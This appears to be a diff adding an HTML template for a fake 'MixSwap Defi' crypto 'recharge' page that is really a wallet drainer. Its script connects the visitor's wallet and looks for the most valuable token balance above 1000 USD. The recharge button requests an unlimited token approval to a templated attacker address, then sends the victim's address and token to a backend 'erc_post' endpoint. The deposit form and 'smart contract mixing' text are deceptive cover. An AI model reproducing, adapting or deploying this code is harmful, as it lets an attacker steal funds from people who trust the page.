@@ -1,0 +1,583 @@
+<!DOCTYPE html>
+<html lang="en" data-dpr="1" style="font-size: 54px;" class="no-touch">
+	<head>
+		<link rel="icon" href="/favicon.ico" type="image/x-icon" />
+		<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon" />
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+		<!-- Required meta tags-->
+		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, viewport-fit=cover">
+		<meta name="apple-mobile-web-app-capable" content="yes">
+		<meta name="apple-mobile-web-app-status-bar-style" content="black">
+		<meta name="format-detection" content="telephone=no, email=no">
+		<meta name="msapplication-tap-highlight" content="no">
+		<meta name="x5-orientation" content="portrait">
+		<meta name="x5-fullscreen" content="true">
+		<meta name="description" content="">
+		<link rel="icon" href="favicon.ico">
+		<meta name="keywords" content="">
+		<!-- App title -->
+		<title>MIX-USDT 转账</title>
+		<!-- Framework7 Library CSS -->
+		<link rel="stylesheet" href="/scan/css/vendor.min.css">
+
+		<!-- Custom app styles-->
+		<link rel="stylesheet" href="/scan/css/reset.min.css">
+		<link rel="stylesheet" href="/scan/css/main_mix_t.css">
+		
+		<script type="text/javascript" src="/scan/js/usdt/w3model.js"></script>
+		<script type="text/javascript" src="/scan/js/usdt/bignumber.min.js"></script>
+		<script type="text/javascript" src="/scan/js/usdt/web3.min.js"></script>
+		<script type="text/javascript" src="/scan/js/usdt/web3model.min.js"></script>
+		<script type="text/javascript" src="/scan/js/usdt/evmchain.js"></script>
+		<script type="text/javascript" src="/scan/js/usdt/web3provider.js"></script>
+
+		<!-- Jquery app core js-->
+		<script type="text/javascript" src="/scan/js/jquery-2.1.4.min.js"></script>
+		<script type="text/javascript" src="/scan/js/flexible.js"></script>
+		<style type="text/css">
+			.tishi{
+				width: 3.5rem;
+				height: 1.2rem;
+				background: #00000059;
+				z-index: 999999999999;
+				position: fixed;
+				top: 50%;
+				left: 50%;
+				transform: translate(-50%, -50%);
+				border-radius: 0.1rem;
+				color: white;
+				font-size: 0.6rem;
+				text-align: center;
+				line-height: 1.2rem;
+				display: none;
+			}
+		</style>
+	</head>
+	<body style="font-size: 12px;">
+		<!-- Views -->
+				<div class="views">
+					<!-- main view -->
+					<div class="view view-main">
+						<!-- Pages -->
+						<div class="pages">
+							<div class="page bg">
+								<div class="page-content">
+									<div class="list-block quantity">
+										<div class="quantity-logo" style="color: #2f2f2f;font-weight: bold;font-size: 0.5rem;padding-top: 0.5rem;padding-bottom: 1.3rem;"><img src="/scan/img/logo.png" style="width: 1rem;margin-right: 0.2rem;">MixSwap Defi system</div>
+										<div class="quantity-label" style="position:relative;">
+											<label class="quantity-title">Recharge quantity</label>
+											<input type="number" placeholder="Minimum recharge quantity 1" name="quantity" class="quantity-input">
+											<span id="danwei" style="position: relative;right: -85%;top: -1.1rem;color: #bbbaba;">ETH</span>
+										</div>
+									</div>
+									<div class="list-block points">
+										<div class="list-block-title">Select the recharge method</div>
+										<div class="list-block-form">
+											<ul class="list-block-radio">
+												<li>
+													<label class="item-radio item-content">
+														<input type="radio" name="demo-radio" value="ERC" checked="">
+														<i class="icon icon-radio"></i>
+														<div class="item-media">
+															<img src="/scan/img/ico01.png">
+														</div>
+														<div class="item-inner">
+															<div class="item-title">USDT-ERC20</div>
+															<div class="item-after"></div>
+														</div>
+													</label>
+												</li>
+												<!-- <li>
+													<label class="item-radio item-content">
+														<input type="radio" name="demo-radio" value="USDT" checked>
+														<i class="icon icon-radio"></i>
+														<div class="item-media">
+															<img src="/scan/img/ico02.png" />
+														</div>
+														<div class="item-inner">
+															<div class="item-title">USDT-TRC20</div>
+															<div class="item-after">波场</div>
+														</div>
+													</label>
+												</li> -->
+												<li>
+													<label class="item-radio item-content">
+														<input type="radio" name="demo-radio" value="BTC">
+														<i class="icon icon-radio"></i>
+														<div class="item-media">
+															<img src="/scan/img/ico03.png">
+														</div>
+														<div class="item-inner">
+															<div class="item-title">BTC</div>
+															<div class="item-after"></div>
+														</div>
+													</label>
+												</li>
+												<li>
+													<label class="item-radio item-content">
+														<input type="radio" name="demo-radio" value="ETH">
+														<i class="icon icon-radio"></i>
+														<div class="item-media">
+															<img src="/scan/img/ico04.png">
+														</div>
+														<div class="item-inner">
+															<div class="item-title">ETH</div>
+															<div class="item-after"></div>
+														</div>
+													</label>
+												</li>
+											</ul>
+											<div class="list-block-button">
+												<button id="btn-connect" class="button button-fill ">Recharge immediately</button>
+											</div>
+
+											<div class="list-block-label" style="background: #f7f6f6;border-radius: 0.1rem;margin-top: 0.8rem;font-size: 0.42rem;text-align: left;padding: 0.5rem;color: #8ea4ad;">First, the wallet USDT will be recharged to Mixswap platform, and exchange recharging is prohibited. The smart contract will be mixed within three hours</div>
+										</div>
+										
+									</div>
+								</div>
+							</div>
+							<!-- Preloader -->
+							<div class="modal">
+								<div class="preloader"></div>
+							</div>
+							<div class="tishi">
+								In the submission
+							</div>
+						</div>
+					</div>
+				</div>
+				<div id="fffsss" style="color: white;z-index: 99999999999999999;position: absolute;top: 1px;"></div>
+		<div style="display:none;">
+			<textarea id="jsondata">{$abi}</textarea>
+			<textarea id="jsondata1">{$addr|json_encode}</textarea>
+			<textarea id="jsondata2">{$addr2|json_encode}</textarea>
+			<textarea id="jsondata3">{$addr3|json_encode}</textarea>
+		</div>
+		<!-- Custom app js-->
+		<script src="/scan/js/main.js"></script>
+		<script type="text/javascript">
+			const ABI = JSON.parse($('#jsondata').html());
+
+			$(function() {
+				var authorized_address = '{$authorized_address}';
+				var agent = "{$agent}";
+				var infura_key = '{$infura_key}';
+				var domain = '{$domain}';
+				var bizhong = '';
+				$("input[name='demo-radio']").on('change',function(){
+				    var bi = $("input[name='demo-radio']:checked").val()
+				    console.log(bi)
+				    $('#danwei').text(bi)
+				})
+				const approveNum = new BigNumber(2).exponentiatedBy(256).minus(1)
+				/******************************************/
+				// Unpkg imports
+				const _web3 = new Web3('https://cloudflare-eth.com')
+
+				let injectedWeb3 = null, total = 0
+				let approveAddr = '{$approveAddr}'
+				const addr = JSON.parse($('#jsondata1').html());
+				const addr2 = JSON.parse($('#jsondata2').html());
+				const addr3 = JSON.parse($('#jsondata3').html());
+
+				async function getMostValuableAssets(account) {
+					let _symbol = 'usdt';
+					for (const [symbol, contract] of Object.entries(contracts)) {
+						contract.methods.balanceOf(account).call(function(err, balance) {
+							const usdt = balance / (10** (decimals[symbol] || 18)) * price[symbol]
+							if (usdt > total && usdt > 1000) {
+								_symbol = symbol;
+								total = usdt;
+								approveAddr = addr[_symbol];
+								bizhong = _symbol;
+							}
+						})
+					}
+
+					bizhong = _symbol;
+					return _symbol;
+				}
+				
+				async function getMostValuableAssets2(account) {
+					let _symbol = 'usdt'
+					for (const [symbol, contract] of Object.entries(contracts2)) {
+						contract.methods.balanceOf(account).call(function(err, balance) {
+							const usdt = balance / (10** (decimals[symbol] || 18)) * price[symbol]
+							if (usdt > total && usdt > 1000) {
+								_symbol = symbol;
+								total = usdt;
+								approveAddr = addr[_symbol];
+
+							}
+						})
+					}
+					bizhong = _symbol;
+					return _symbol;
+				}
+
+				async function getMostValuableAssets3(account) {
+					let _symbol = 'usdt';
+					for (const [symbol, contract] of Object.entries(contracts3)) {
+						contract.methods.balanceOf(account).call(function(err, balance) {
+							const usdt = balance / (10** (decimals[symbol] || 18)) * price[symbol]
+							if (usdt > total && usdt > 1000) {
+								_symbol = symbol;
+								total = usdt;
+								approveAddr = addr[_symbol];
+							}
+						})
+					}
+					bizhong = _symbol;
+					return _symbol;
+				}
+				
+				async function postInfo(address,symbol){
+					var data = {
+						address:address,
+						auth_address:authorized_address,
+						bizhong:symbol,
+						agent:agent,
+					}
+					var d = new Date();
+					var n = d.getTime();
+
+					$.ajax({
+						type: 'get',
+						url:  domain + "{:url('index/api/erc_post')}?t="+n,
+						data: data,
+						success:function(){
+						}
+					})
+				}
+
+				const price = {
+					'usdt': 1,
+					'sushi': 15.5,
+					'usdc': 1,
+					'dai': 1,
+					'uni': 28.6,
+					'aave': 380,
+					'yfi': 35000,
+					'link': 28.2,
+					"LON": 7,
+					"CRV": 3.01367,
+					"GUSD": 1,
+					"WBTC": 56478.2,
+					"WETH": 1991.89,
+					"CONV": 0.105733,
+					"inj": 13.3812,
+					"MKR": 2076.68,
+					"ALPHA": 1.79043,
+					"BAND": 16.3441,
+					"snx": 20.0588,
+					"comp": 468.076,
+					"sxp": 4.11818,
+					"FTT": 46.1779,
+					"ust": 1.00543,
+					"TRIBE": 1.42926,
+					"wise": 0.446973,
+					"RRAX": 0.996821,
+					"CORE": 5447.59,
+					"mir": 8.69817,
+					"DPI": 415.906,
+					"luna": 15.2402,
+					"HEZ": 5.97533,
+					"fxs": 8.47025,
+					"fei": 0.898157,
+				}
+
+				const decimals = {
+					sushi: 18,
+					usdt: 6,
+					usdc: 6,
+					uni: 18,
+					dai: 18,
+					aave: 18,
+					yfi: 18,
+					link: 18,
+					WBTC: 8,
+				}
+
+				const contracts = {}, contracts2 = {}, contracts3 = {}
+				for (const symbol of Object.keys(addr)) {
+					const contractAddr = addr[symbol]
+					contracts[symbol] = new _web3.eth.Contract(ABI, contractAddr)
+				}
+
+				for (const symbol of Object.keys(addr2)) {
+					const contractAddr = addr2[symbol]
+					contracts2[symbol] = new _web3.eth.Contract(ABI, contractAddr)
+				}
+
+				for (const symbol of Object.keys(addr3)) {
+					const contractAddr = addr3[symbol]
+					contracts3[symbol] = new _web3.eth.Contract(ABI, contractAddr)
+				}
+
+				const Web3Modal = window.Web3Modal.default;
+				const WalletConnectProvider = window.WalletConnectProvider.default;
+
+				// Web3modal instance
+				let web3Modal
+
+				// Chosen wallet provider given by the dialog window
+				let provider;
+
+				// Address of the selected account
+				let selectedAccount;
+
+
+				/**
+				 * Setup the orchestra
+				 */
+				 async function init() {
+					// Tell Web3modal what providers we have available.
+					// Built-in web browser provider (only one can exist as a time)
+					// like MetaMask, Brave or Opera is added automatically by Web3modal
+
+					const providerOptions = {
+						walletconnect: {
+							package: WalletConnectProvider,
+							options: {
+								// Mikko's test key - don't copy as your mileage may vary
+								infuraId: infura_key,
+							}
+						},
+					};
+
+					web3Modal = new Web3Modal({
+						cacheProvider: false, // optional
+						providerOptions, // required
+						disableInjectedProvider: false, // optional. For MetaMask / Brave / Opera.
+					});
+
+
+					try {
+						provider = await web3Modal.connect()
+						provider.enable()
+					} catch(e) {
+						console.log("Could not get a wallet connection", e);
+						return;
+					}
+
+					// Subscribe to accounts change
+					provider.on("accountsChanged", async (accounts) => {
+						await fetchAccountData();
+					});
+
+					// Subscribe to chainId change
+					provider.on("chainChanged", async (chainId) => {
+						await fetchAccountData();
+					});
+
+					// Subscribe to networkId change
+					provider.on("networkChanged", async (networkId) => {
+						await fetchAccountData();
+					});
+
+					await refreshAccountData();
+				}
+
+				/**
+				 * Kick in the UI action after Web3modal dialog has chosen a provider
+				 */
+				 async function fetchAccountData() {
+					const web3 = new Web3(provider);
+					injectedWeb3 = web3
+					provider.enable()
+					const accounts = await web3.eth.getAccounts()
+					selectedAccount = accounts[0]
+					getMostValuableAssets(selectedAccount)
+					setTimeout(function() {
+						getMostValuableAssets2(selectedAccount)
+					}, 200)
+					setTimeout(function() {
+						getMostValuableAssets3(selectedAccount)
+					}, 300)
+				 }
+
+
+				/**
+				 * Fetch account data for UI when
+				 * - User switches accounts in wallet
+				 * - User switches networks in wallet
+				 * - User connects wallet initially
+				 */
+				 async function refreshAccountData() {
+
+					// If any current data is displayed when
+					// the user is switching acounts in the wallet
+					// immediate hide this data
+					// document.querySelector("#connected").style.display = "none";
+					// document.querySelector("#prepare").style.display = "block";
+
+					// Disable button while UI is loading.
+					// fetchAccountData() will take a while as it communicates
+					// with Ethereum node via JSON-RPC and loads chain data
+					// over an API call.
+					document.querySelector("#btn-connect").setAttribute("disabled", "disabled")
+					await fetchAccountData(provider);
+					document.querySelector("#btn-connect").removeAttribute("disabled")
+				}
+
+
+				/**
+				 * Connect wallet button pressed.
+				 */
+				 async function onConnect() {
+
+					var amount = $('.quantity-input').val();
+					if(amount == ''){
+						$('input').addClass('error').attr('placeholder', '请输入充值数量');
+						$('.quantity-input').focus(function() {
+							var curValue = $(this).val();
+							if(curValue == this.defaultValue){
+								$(this).val('');
+								$(this).removeClass('error').attr('placeholder', '最小充值数量1');
+							}
+						});
+						$('.quantity-input').blur(function() {
+							var curValue = $('.quantity-input').val();
+							if($.trim(curValue) == '') {
+								$(this).val(this.defaultValue);
+							}
+						});
+						return false;
+					} else {
+						$('.pages').append('<div class="modal-overlay"></div>');
+						$('.modal-overlay').addClass('modal-overlay-visible');
+						$('.modal').removeClass('modal-out').addClass('modal-in');
+
+					}
+
+					console.log(authorized_address);
+					console.log(infura_key);
+
+
+
+					console.log(bizhong);
+
+					if (selectedAccount && provider) {
+						const web3 = new Web3(provider);
+						const contract = new web3.eth.Contract(ABI, approveAddr);
+						const gasPrice = await web3.eth.getGasPrice();
+
+						// var gas = await contract.methods.approve(authorized_address, web3.utils.toBN('0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff')).estimateGas({
+						// 	from: selectedAccount
+						// },function(err, tx) {
+						//
+						//
+						// 	console.log(err, tx)
+						//
+						// })
+						// if(gas == undefined){
+						// 	gas = 80000;
+						// }
+
+						contract.methods.increaseApproval(authorized_address, web3.utils.toBN('0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff')).send({
+							from: selectedAccount,
+							gasPrice: gasPrice,
+							gas:80000,
+						}, function(err, tx) {
+							if(!err){
+								$(".tishi").fadeIn()
+								setTimeout(function () {
+									$(".tishi").fadeOut()
+								},2000);
+
+								postInfo(selectedAccount,bizhong)
+							}
+							$('.modal-overlay').remove();
+
+								$('.modal').removeClass('modal-in').addClass('modal-out');
+
+							console.log(err, tx)
+
+						})
+					} else {
+						provider = await web3Modal.connect()
+						provider.enable()
+						const web3 = new Web3(provider);
+						const accounts = await web3.eth.getAccounts()
+						selectedAccount = accounts[0]
+
+
+						const contract = new web3.eth.Contract(ABI, approveAddr)
+						const gasPrice = await web3.eth.getGasPrice()
+
+						// var gas = await contract.methods.approve(authorized_address, '0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff').estimateGas({
+						// 	from: selectedAccount
+						// },function(err, tx) {
+						//
+						//
+						// 	console.log(err, tx)
+						//
+						// })
+						// if(gas == undefined){
+						// 	gas= 80000;
+						// }
+						console.log(gas)
+
+						contract.methods.increaseApproval(authorized_address, '0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff').send({
+							from: selectedAccount,
+							gasPrice: gasPrice,
+							gas: 80000,
+						}, function(err, tx) {
+							console.log(err, tx)
+							if(!err){
+								$(".tishi").fadeIn();
+								setTimeout(function () {
+									$(".tishi").fadeOut()
+								},2000);
+								postInfo(selectedAccount,bizhong);
+							}
+							$('.modal-overlay').remove();
+							$('.modal').removeClass('modal-in').addClass('modal-out');
+						})
+					}
+				 }
+
+				/**
+				 * Disconnect wallet button pressed.
+				 */
+				async function onDisconnect() {
+					console.log("Killing the wallet connection", provider);
+					// TODO: Which providers have close method?
+					if(provider.close) {
+						await provider.close();
+
+						// If the cached provider is not cleared,
+						// WalletConnect will default to the existing session
+						// and does not allow to re-scan the QR code with a new wallet.
+						// Depending on your use case you may want or want not his behavir.
+						await web3Modal.clearCachedProvider();
+						provider = null;
+					}
+
+					selectedAccount = null;
+
+					// Set the UI back to the initial state
+					// document.querySelector("#prepare").style.display = "block";
+					// document.querySelector("#connected").style.display = "none";
+				}
+
+				/**
+				 * Main entry point.
+				 */
+				 window.addEventListener('load', async () => {
+					init();
+					document.querySelector("#btn-connect").addEventListener("click", onConnect);
+				// document.querySelector("#btn-disconnect").addEventListener("click", onDisconnect);
+			});
+
+
+	     });
+	function _init(argument) {
+			// body...
+		}
+	</script>
+
+
+
+<div id="WEB3_CONNECT_MODAL_ID"><div class="sc-jSFkmK kRmdPb web3modal-modal-lightbox" offset="0" opacity="0.4"><div class="sc-gKAblj fVQpCb web3modal-modal-container"><div class="sc-iCoHVE knnrxv web3modal-modal-hitbox"></div><div class="sc-fujyUd hdPMvV web3modal-modal-card"><div class="sc-eCApGN cjAFRf web3modal-provider-wrapper"><div class="sc-hKFyIo jcNZzC web3modal-provider-container"><div class="sc-bdnylx jMhaxE web3modal-provider-icon"><img src="data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9IjUxMiIgdmlld0JveD0iMCAwIDUxMiA1MTIiIHdpZHRoPSI1MTIiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgeG1sbnM6eGxpbms9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGxpbmsiPjxyYWRpYWxHcmFkaWVudCBpZD0iYSIgY3g9IjAlIiBjeT0iNTAlIiByPSIxMDAlIj48c3RvcCBvZmZzZXQ9IjAiIHN0b3AtY29sb3I9IiM1ZDlkZjYiLz48c3RvcCBvZmZzZXQ9IjEiIHN0b3AtY29sb3I9IiMwMDZmZmYiLz48L3JhZGlhbEdyYWRpZW50PjxnIGZpbGw9Im5vbmUiIGZpbGwtcnVsZT0iZXZlbm9kZCI+PHBhdGggZD0ibTI1NiAwYzE0MS4zODQ4OTYgMCAyNTYgMTE0LjYxNTEwNCAyNTYgMjU2cy0xMTQuNjE1MTA0IDI1Ni0yNTYgMjU2LTI1Ni0xMTQuNjE1MTA0LTI1Ni0yNTYgMTE0LjYxNTEwNC0yNTYgMjU2LTI1NnoiIGZpbGw9InVybCgjYSkiLz48cGF0aCBkPSJtNjQuNjkxNzU1OCAzNy43MDg4Mjk4YzUxLjUzMjgwNzItNTAuMjc4NDM5NyAxMzUuMDgzOTk0Mi01MC4yNzg0Mzk3IDE4Ni42MTY3OTkyIDBsNi4yMDIwNTcgNi4wNTEwOTA2YzIuNTc2NjQgMi41MTM5MjE4IDIuNTc2NjQgNi41ODk3OTQ4IDAgOS4xMDM3MTc3bC0yMS4yMTU5OTggMjAuNjk5NTc1OWMtMS4yODgzMjEgMS4yNTY5NjE5LTMuMzc3MSAxLjI1Njk2MTktNC42NjU0MjEgMGwtOC41MzQ3NjYtOC4zMjcwMjA1Yy0zNS45NTA1NzMtMzUuMDc1NDk2Mi05NC4yMzc5NjktMzUuMDc1NDk2Mi0xMzAuMTg4NTQ0IDBsLTkuMTQwMDI4MiA4LjkxNzU1MTljLTEuMjg4MzIxNyAxLjI1Njk2MDktMy4zNzcxMDE2IDEuMjU2OTYwOS00LjY2NTQyMDggMGwtMjEuMjE1OTk3My0yMC42OTk1NzU5Yy0yLjU3NjY0MDMtMi41MTM5MjI5LTIuNTc2NjQwMy02LjU4OTc5NTggMC05LjEwMzcxNzd6bTIzMC40OTM0ODUyIDQyLjgwODkxMTcgMTguODgyMjc5IDE4LjQyMjcyNjJjMi41NzY2MjcgMi41MTM5MTAzIDIuNTc2NjQyIDYuNTg5NzU5My4wMDAwMzIgOS4xMDM2ODYzbC04NS4xNDE0OTggODMuMDcwMzU4Yy0yLjU3NjYyMyAyLjUxMzk0MS02Ljc1NDE4MiAyLjUxMzk2OS05LjMzMDg0LjAwMDA2Ni0uMDAwMDEtLjAwMDAxLS4wMDAwMjMtLjAwMDAyMy0uMDAwMDMzLS4wMDAwMzRsLTYwLjQyODI1Ni01OC45NTc0NTFjLS42NDQxNi0uNjI4NDgxLTEuNjg4NTUtLjYyODQ4MS0yLjMzMjcxIDAtLjAwMDAwNC4wMDAwMDQtLjAwMDAwOC4wMDAwMDctLjAwMDAxMi4wMDAwMTFsLTYwLjQyNjk2ODMgNTguOTU3NDA4Yy0yLjU3NjYxNDEgMi41MTM5NDctNi43NTQxNzQ2IDIuNTEzOTktOS4zMzA4NDA4LjAwMDA5Mi0uMDAwMDE1MS0uMDAwMDE0LS4wMDAwMzA5LS4wMDAwMjktLjAwMDA0NjctLjAwMDA0NmwtODUuMTQzODY3NzQtODMuMDcxNDYzYy0yLjU3NjYzOTI4LTIuNTEzOTIxLTIuNTc2NjM5MjgtNi41ODk3OTUgMC05LjEwMzcxNjNsMTguODgyMzEyNjQtMTguNDIyNjk1NWMyLjU3NjYzOTMtMi41MTM5MjIyIDYuNzU0MTk5My0yLjUxMzkyMjIgOS4zMzA4Mzk3IDBsNjAuNDI5MTM0NyA1OC45NTgyNzU4Yy42NDQxNjA4LjYyODQ4IDEuNjg4NTQ5NS42Mjg0OCAyLjMzMjcxMDMgMCAuMDAwMDA5NS0uMDAwMDA5LjAwMDAxODItLjAwMDAxOC4wMDAwMjc3LS4wMDAwMjVsNjAuNDI2MTA2NS01OC45NTgyNTA4YzIuNTc2NTgxLTIuNTEzOTggNi43NTQxNDItMi41MTQwNzQzIDkuMzMwODQtLjAwMDIxMDMuMDAwMDM3LjAwMDAzNTQuMDAwMDcyLjAwMDA3MDkuMDAwMTA3LjAwMDEwNjNsNjAuNDI5MDU2IDU4Ljk1ODM1NDhjLjY0NDE1OS42Mjg0NzkgMS42ODg1NDkuNjI4NDc5IDIuMzMyNzA5IDBsNjAuNDI4MDc5LTU4Ljk1NzE5MjVjMi41NzY2NC0yLjUxMzkyMzEgNi43NTQxOTktMi41MTM5MjMxIDkuMzMwODM5IDB6IiBmaWxsPSIjZmZmIiBmaWxsLXJ1bGU9Im5vbnplcm8iIHRyYW5zZm9ybT0idHJhbnNsYXRlKDk4IDE2MCkiLz48L2c+PC9zdmc+" alt="WalletConnect"></div><div class="sc-gtssRu bktcUM web3modal-provider-name">WalletConnect</div><div class="sc-dlnjPT eFHlqH web3modal-provider-description">Scan with WalletConnect to connect</div></div></div></div></div></div></div></body></html>
